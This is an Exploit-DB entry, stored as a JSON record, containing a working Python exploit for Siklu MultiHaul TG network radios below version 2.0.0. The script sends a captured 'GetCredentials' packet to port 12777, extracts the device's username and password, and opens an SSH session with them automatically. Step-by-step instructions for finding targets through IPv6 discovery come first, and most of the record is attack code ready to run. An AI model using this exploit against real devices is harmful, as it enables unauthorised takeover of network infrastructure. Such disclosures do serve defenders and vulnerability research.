{"source": "https://www.exploit-db.com/exploits/51932", "vulnName": "Siklu MultiHaul TG series < 2.0.0 - unauthenticated credential disclosure", "vulnEDBID": "51932", "vulnCVE": "N/A", "author": "SEMAJA2", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-28", "vulnContent": "# Exploit Title: Siklu MultiHaul TG series - unauthenticated credential disclosure\n# Date: 28-02-2024\n# Exploit Author: semaja2\n# Vendor Homepage: https://siklu.com/\n# Software Link: https://partners.siklu.com/home/frontdoor\n# Version: < 2.0.0\n# Tested on: 2.0.0\n# CVE : None assigned\n#\n# Instructions\n# 1. Perform IPv6 host detect by pinging all host multicast address for interface attached to device\n# `ping6 -I en7 -c 2 ff02::1`\n# 2. Review IPv6 neighbours and identify target device based on vendor component of MAC address\n# `ip -6 neigh show dev en7`\n# 3. Execute script\n# `python3 tg-getcreds.py fe80::34d9:1337:b33f:7001%en7`\n# 4. Enjoy the access\n\n\n\nimport socket\nimport sys\nimport os\n\naddress = str(sys.argv[1])  # the target\nport = 12777\n\n# Captured command, sends \"GetCredentials\" to obtain random generated username/password\ncmd = bytearray.fromhex(\"000000290FFF000100000001000100000000800100010000000E47657443726564656E7469616C730000000000\")\n\naddrinfo = socket.getaddrinfo(address, port, socket.AF_INET6, socket.SOCK_STREAM)\n(family, socktype, proto, canonname, sockaddr) = addrinfo[0]\ns = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\ns.connect(sockaddr)\ns.send(cmd)\ndata = s.recv(200)\ns.close()\noutput = \"\".join(map(chr, data))\n\n# Split output, then remove trailing noise as string length is always 35\nsplits = output.split('#')\nusername = splits[1][slice(0, 35, 1)]\npassword = splits[2][slice(0, 35, 1)]\nprint('Username: ', username)\nprint('Password: ', password)\nos.system(\"sshpass -p {password} ssh -o StrictHostKeychecking=no {address} -l {username}\".format(address = address, username = username, password = password))\n            "}